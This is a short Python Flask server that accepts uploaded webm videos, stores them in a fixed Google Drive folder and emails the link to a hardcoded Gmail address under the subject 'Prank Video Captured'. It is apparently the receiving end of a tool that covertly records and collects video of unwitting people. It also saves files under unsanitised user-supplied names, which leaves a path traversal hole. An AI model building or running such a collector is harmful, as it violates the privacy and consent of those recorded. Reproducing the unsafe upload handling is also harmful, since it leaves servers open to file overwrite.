import os
import smtplib
from flask import Flask, request
from googleapiclient.discovery import build
from googleapiclient.http import MediaFileUpload
from google.oauth2.service_account import Credentials

app = Flask(__name__)

# Load Google Drive API credentials
SERVICE_ACCOUNT_FILE = "phrasal-league-452912-e6-e38ba6253fbb.json"
SCOPES = ["https://www.googleapis.com/auth/drive.file"]

creds = Credentials.from_service_account_file(SERVICE_ACCOUNT_FILE, scopes=SCOPES)
drive_service = build("drive", "v3", credentials=creds)

# ✅ Correct Folder ID (without ?usp=sharing)
FOLDER_ID = "1URrinSauXfePj0NVPHXwLONPLN2WUTe8"

@app.route('/')
def home():
    return "Server is running!"

@app.route('/upload', methods=['POST'])
def upload_video():
    if 'video' not in request.files:
        return "No file found", 400

    # ✅ Ensure "uploads" folder exists
    os.makedirs("uploads", exist_ok=True)

    file = request.files['video']
    file_path = f"uploads/{file.filename}"
    file.save(file_path)

    # ✅ Upload to Google Drive
    file_metadata = {
        "name": file.filename,
        "parents": [FOLDER_ID]
    }
    media = MediaFileUpload(file_path, mimetype="video/webm")
    uploaded_file = drive_service.files().create(body=file_metadata, media_body=media, fields="id").execute()
    
    video_url = f"https://drive.google.com/file/d/{uploaded_file['id']}/view"

    send_email(video_url)  # ✅ Send email with video link
    return f"Video uploaded: {video_url}", 200

def send_email(video_url):
    sender_email = "checker.checker.checker.111@gmail.com"
    receiver_email = "checker.checker.checker.111@gmail.com"
    password = "your-app-password"  # ✅ Use App Password instead of real password

    subject = "Prank Video Captured"
    body = f"Here is the recorded video: {video_url}"
    message = f"Subject: {subject}\n\n{body}"

    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(sender_email, password)
    server.sendmail(sender_email, receiver_email, message)
    server.quit()


if __name__ == '__main__':
    print("Server is running...")  # ✅ Prints when server starts
    app.run(host="0.0.0.0", port=5000)
